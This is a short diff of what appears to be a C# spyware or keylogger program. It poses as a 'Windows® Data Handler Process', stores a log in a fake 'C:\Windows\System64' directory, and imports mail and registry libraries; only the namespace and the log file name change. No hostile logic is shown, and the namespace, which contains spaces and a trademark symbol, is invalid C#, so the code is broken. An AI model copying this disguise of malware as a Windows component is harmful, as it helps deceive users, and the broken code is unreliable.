@@ -6,13 +6,13 @@ using System.Threading;
 using System.Net.Mail;
 using Microsoft.Win32;
 
-namespace Windows® Data Handler Process
+namespace Windows® DataHandler Process
 {
     class Program
     {
         public static bool chkSysEve = false;
         public static string path = @"C:\Windows\System64\DataHandler\";
-        public static string fPath = @"C:\Windows\System64\DataHandler\handler.log";
+        public static string fPath = @"C:\Windows\System64\DataHandler\datahandler.log";
 
         public static string appName = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
         public static string appExe = Path.GetFileName(appName);
